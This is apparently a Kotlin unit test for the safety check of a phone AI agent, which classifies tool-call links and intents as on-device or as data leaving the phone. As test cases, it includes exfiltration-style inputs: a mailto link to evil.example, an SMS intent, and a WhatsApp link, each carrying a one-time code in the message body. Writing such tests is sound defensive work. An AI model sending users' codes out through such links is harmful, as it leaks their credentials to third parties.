package com.aura.aura_ui.agentcore

import com.aura.aura_ui.agent.research.InstalledApp
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/** Step 1 of fix-safety-approvals: opening something on the phone is never a send-out. */
class ToolHubSendOutTest {

    private val whatsapp = InstalledApp("WhatsApp", "com.whatsapp", null)

    private fun sendOut(args: String, egress: Boolean = false, request: String = "", app: InstalledApp? = null) =
        ToolHub.sendOut(egress, args, request, emptySet(), appFor = { app })

    @Test
    fun `a Settings action is not a URL and stays on the phone`() {
        assertFalse(sendOut("""{"uri":"android.settings.BATTERY_SAVER_SETTINGS"}"""))
        assertFalse(sendOut("""{"action":"android.settings.WIFI_SETTINGS"}"""))
    }

    @Test
    fun `a URL no installed app opens is a send-out`() {
        assertTrue(sendOut("""{"uri":"https://evil.example/?q=hi"}""", request = "say hi"))
    }

    @Test
    fun `a chat link carrying only the user's words to their app stays on the phone`() {
        val request = "send running late to 919876543210 on WhatsApp"
        assertFalse(sendOut("""{"uri":"https://wa.me/919876543210?text=running%20late"}""", request = request, app = whatsapp))
        // The same link with words the user never said leaves through the app's servers.
        assertTrue(sendOut("""{"uri":"https://wa.me/919876543210?text=otp%20is%20482913"}""", request = request, app = whatsapp))
    }

    @Test
    fun `an intent link always counts, and a web tool always counts`() {
        assertTrue(sendOut("""{"uri":"intent://x#Intent;package=com.whatsapp;end"}""", app = whatsapp))
        assertTrue(sendOut("""{"query":"weather"}""", egress = true))
    }

    @Test
    fun `a link with no slashes still counts`() {
        assertTrue(sendOut("""{"uri":"mailto:x@evil.example?body=otp%20482913"}"""))
        assertTrue(sendOut("""{"action":"android.intent.action.SENDTO","data":"sms:12345?body=otp%20482913"}"""))
        // A JSON key, a package and a time of day are not links.
        assertFalse(sendOut("""{"package":"com.android.settings","note":"at 10:30"}"""))
    }
}
